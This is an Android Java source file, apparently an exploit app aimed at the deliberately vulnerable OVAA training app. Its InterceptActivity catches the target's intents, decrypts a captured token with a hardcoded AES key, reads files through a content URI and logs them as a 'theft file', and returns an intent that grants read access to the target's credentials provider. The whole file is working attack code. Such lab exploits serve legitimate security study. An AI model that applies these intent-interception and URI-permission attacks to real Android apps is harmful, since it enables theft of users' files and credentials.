package com.example.ovaaexploit;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class InterceptActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent().getAction() == "oversecured.ovaa.action.WEBVIEW"){
            String data = getIntent().getStringExtra("url");
            String token = data.split("token=")[1];
            Log.d("Debug","[*]crypt token is: " + token);
            //Weak Crypto
            //use AES can decrypt
            final String KEY = "49u5gh249gh24985ghf429gh4ch8f23f";
            try {
                SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "AES");
                Cipher instance = Cipher.getInstance("AES");
                instance.init(Cipher.DECRYPT_MODE, secretKeySpec);
                String destoken = new String(instance.doFinal(Base64.decode(token,0)));
                Log.d("Debug","[*]decrypt token is: " + destoken);
            }
            catch (Exception e) {

            }
        } else if (getIntent().getAction() == "oversecured.ovaa.action.EVIL") {
            try {
                Uri uri = getIntent().getData();
                ContentResolver cr = getApplicationContext().getContentResolver();
                FileInputStream fis = (FileInputStream)cr.openInputStream(uri);
                BufferedReader r = new BufferedReader(new InputStreamReader(fis));
                String stealer = "";
                String mLine;
                while ((mLine = r.readLine()) != null) {
                    stealer += (mLine + "\n");
                }
                Log.d("debug","[*]theft file: " + stealer);
            } catch (Throwable th){
                throw new RuntimeException(th);
            }
        } else {
            Intent intent = new Intent("android.intent.VIEW");
            intent.setData(Uri.parse("content://oversecured.ovaa.creds_provider/"));
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            setResult(RESULT_OK, intent);
            finish();
        }
    }
}
